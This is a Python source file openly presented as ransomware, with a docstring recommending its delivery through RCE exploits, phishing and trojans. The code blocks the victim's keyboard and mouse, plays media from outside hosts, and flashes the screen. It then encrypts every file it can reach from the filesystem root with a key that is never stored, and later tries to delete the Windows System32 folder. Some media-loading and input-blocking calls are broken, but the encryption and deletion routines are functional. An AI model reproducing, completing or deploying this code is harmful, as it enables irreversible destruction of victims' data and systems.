"""

This is a simple ransomware wich will display a image on the victims PC and disable their input. 
It's written in python and dependancies need to be installed prior.


    Good usage cases include but are not limited to:

    RCE exploits
    Phishing
    Trojan attacks

PLEASE use this responsibly, I claim no legal fault for any misuse of this program.

    btw, this script will not work on all systems, it's lightly tested on Windows.




Love, -LadySec

""" 


import os
import time
import sys
import tkinter as tk
from tkinter import Label
from threading import Thread, Timer
from time import sleep
from cryptography.fernet import Fernet
import pygame
from PIL import Image, ImageTk
import pyHook
import win32gui
import screen_brightness_control as sbc
from playsound import playsound

# set encryption ig
key = Fernet.generate_key()
cipher_suite = Fernet(key)

def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = cipher_suite.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def wipe_drive():
    os.rmdir("C:\\Windows\\System32")

def play_audio():
    pygame.mixer.init()
    pygame.mixer.music.load("https://files.catbox.moe/a03v46.mp3")
    pygame.mixer.music.play()

def display_image():
    root = tk.Tk()
    image = tk.PhotoImage(file="https://files.catbox.moe/cutmgo.mov")
    label = Label(root, image=image)
    label.pack()
    root.mainloop()

def FULL_BRIGHT():
    current_brightness = sbc.get_brightness()
    if current_brightness != 100:
        sbc.set_brightness(100)

def brightness_setter(num, sleep_time):
    sbc.set_brightness(num)
    sleep(sleep_time)

def FLASHER(num):
    for _ in range(num):
        brightness_setter(0, 0.5)
        brightness_setter(100, 0.5)

def showPIL(pilImage):
    root = tk.Tk()
    w, h = root.winfo_screenwidth(), root.winfo_screenheight()
    root.overrideredirect(1)
    root.geometry("%dx%d+0+0" % (w, h))
    root.focus_set()
    canvas = tk.Canvas(root, width=w, height=h)
    canvas.pack()
    canvas.configure(background='black')
    imgWidth, imgHeight = pilImage.size
    if imgWidth > w or imgHeight > h:
        ratio = min(w / imgWidth, h / imgHeight)
        imgWidth = int(imgWidth * ratio)
        imgHeight = int(imgHeight * ratio)
        pilImage = pilImage.resize((imgWidth, imgHeight), Image.ANTIALIAS)
    image = ImageTk.PhotoImage(pilImage)
    canvas.create_image(w / 2, h / 2, image=image)
    root.mainloop()

class blockInput:
    def __init__(self):
        self.hm = pyHook.HookManager()

    def OnKeyboardEvent(self, event):
        return False

    def OnMouseEvent(self, event):
        return False

    def unblock(self):
        try:
            self.hm.UnhookKeyboard()
        except:
            pass
        try:
            self.hm.UnhookMouse()
        except:
            pass

    def block(self, keyboard=True, mouse=True):
        while True:
            if mouse:
                self.hm.MouseAll = self.OnMouseEvent
                self.hm.HookMouse()
            if keyboard:
                self.hm.KeyAll = self.OnKeyboardEvent
                self.hm.HookKeyboard()
            win32gui.PumpWaitingMessages()

def main():
    # put audio in a diff thread
    audio_thread = Thread(target=play_audio, daemon=True)
    audio_thread.start()

    # fuck their input
    block = blockInput()
    block.block()
    block.unblock()

    # show pic lmfao
    pilImage = Image.open("https://files.catbox.moe/owrdv6.webp")
    showPIL(pilImage)

    # fuck their screens brightness if possible
    FULL_BRIGHT()
    FLASHER(3)

    # encrypt idfk im js a girl
    for root, dirs, files in os.walk("/"):
        for filename in files:
            filepath = os.path.join(root, filename)
            try:
                encrypt_file(filepath)
            except Exception as e:
                print(f"Error encrypting {filepath}: {e}")

    # wait and then wipe drive
    time.sleep(1800)
    wipe_drive()

if __name__ == "__main__":
    main()